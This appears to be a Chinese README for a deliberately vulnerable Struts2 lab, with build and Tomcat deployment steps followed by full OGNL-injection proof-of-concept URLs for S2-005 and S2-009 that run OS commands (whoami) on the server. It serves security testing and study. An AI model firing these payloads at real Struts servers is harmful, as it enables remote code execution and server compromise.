# 环境
Requires Java 1.8+ and Maven 3.x+

# 使用方法
1.下载
git clone https://git.oschina.net/0d/Struts2_bugs.git

2.查看远程分支
git branch -a

3.切换到分支
git checkout 分支名
如git checkout S2-005

4.打包
mvn clean package

5.部署在Tomcat中
将\target中生成的Struts2_bugs-0.0.1-SNAPSHOT.war复制到Tomcat下的webapps目录中，然后开启Tomcat


# 相关信息
1.S2-005
CVE-2010-1870
影响版本：Struts 2.0.0 – Struts 2.1.8.1 
官方公告：http://struts.apache.org/docs/s2-005.html
POC:
http://127.0.0.1:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(h)(('\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter("cmd"))')(d))&(i)(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())')(d))&(i01)(('\43webStr\75new\40byte[1000]')(d))&(i1)(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111)(('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43webStr12)')(d))&(i99)(('\43xman.getWriter().close()')(d))&cmd=cmd /c whoami

2.S2-009
CVE-2011-3923
影响版本：Struts 2.0.0 -Struts 2.3.1.1
官方公告：http://struts.apache.org/docs/s2-009.html
POC:
http://127.0.0.1:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]


